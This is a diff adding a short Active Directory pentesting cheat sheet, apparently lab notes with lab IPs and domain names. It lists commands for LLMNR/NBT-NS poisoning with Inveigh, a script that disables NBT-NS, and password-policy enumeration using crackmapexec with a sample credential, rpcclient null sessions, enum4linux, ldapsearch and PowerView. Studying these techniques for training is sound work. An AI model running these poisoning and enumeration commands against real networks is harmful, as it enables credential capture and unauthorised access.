@@ -1,0 +1,108 @@
+---
+title: AD
+description: Active Directory Commands
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+
+## LLMNR/NBT-NS Poisoning - from Windows
+
+```powershell
+PS C:\Tools> Import-Module .\Inveigh.ps1
+```
+
+```powershell
+PS C:\Tools> (Get-Command Invoke-Inveigh).parameters
+```
+
+```powershell
+PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+```powershell
+Stop-Inveigh
+```
+
+
+```powershell
+Import-Module .\Inveigh.ps1
+```
+
+
+```powershell
+(Get-Command Invoke-Inveigh).Parameters
+```
+
+```powershell
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+
+```powershell
+.\Inveigh.exe
+```
+
+
+PowerShell script used to disable NBT-NS on a Windows host:
+
+```powershell
+$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+```
+
+## Password Spraying
+
+https://github.com/insidetrust/statistically-likely-usernames
+
+https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a
+
+https://web.archive.org/web/20250703081952/https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition
+
+
+## Enumerating the Password Policy - from Linux
+
+```bash
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+```
+
+### Using rpcclient
+
+```bash
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> querydominfo
+rpcclient $> getdompwinfo
+```
+
+### Enum4linux
+
+```bash
+enum4linux -P 172.16.5.5
+```
+
+```bash
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+cat ilfreight.json 
+```
+
+### ldapsearch
+
+```bash
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+
+## Enumerating the Password Policy - from Windows
+
+```powershell
+C:\htb> net accounts
+```
+
+```powershell
+PS C:\htb> import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+```
+
+
+```powershell
+PS C:\htb> import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+```
